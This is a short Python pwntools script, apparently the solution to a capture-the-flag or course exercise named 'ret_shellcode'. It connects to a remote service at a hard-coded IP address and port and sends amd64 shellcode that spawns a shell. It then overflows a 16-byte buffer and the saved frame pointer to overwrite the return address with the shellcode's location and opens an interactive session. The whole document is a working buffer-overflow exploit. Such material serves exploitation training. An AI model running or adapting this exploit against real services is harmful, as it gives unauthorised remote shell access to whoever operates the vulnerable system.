from pwn import *

r = remote('140.113.207.233',8861)
r.recvuntil(':')
context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.linux.sh())
r.sendline(shellcode)
r.recvuntil(':')
"""
$ gdb ret_shellcode
> pdisass main # get name address
"""
address = 0x601060
# overwrite 16 bytes buff, 8 bytes rbp, 8 bytes ret
r.sendline(b'A' * (16 + 8) + p64(address))
r.interactive()
